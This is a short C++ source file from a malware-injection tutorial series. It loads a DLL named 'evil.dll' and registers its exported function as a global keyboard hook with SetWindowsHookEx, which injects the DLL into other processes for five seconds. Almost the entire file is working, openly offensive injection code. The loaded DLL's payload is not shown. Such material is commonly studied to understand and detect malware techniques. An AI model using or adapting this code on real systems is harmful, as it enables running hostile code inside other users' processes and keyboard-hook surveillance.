/*
hack.cpp
DLL inject via SetWindowsHookEx
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2021/11/25/malware-injection-7.html
*/
#include <windows.h>
#include <cstdio>

typedef int (__cdecl *MeowProc)();

int main(void) {
  HINSTANCE meowDll;
  MeowProc meowFunc;
  // load evil DLL
  meowDll = LoadLibrary(TEXT("evil.dll"));

  // get the address of exported function from evil DLL
  meowFunc = (MeowProc) GetProcAddress(meowDll, "Meow");

  // install the hook - using the WH_KEYBOARD action
  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)meowFunc, meowDll, 0);
  Sleep(5*1000);
  UnhookWindowsHookEx(hook);

  return 0;
}
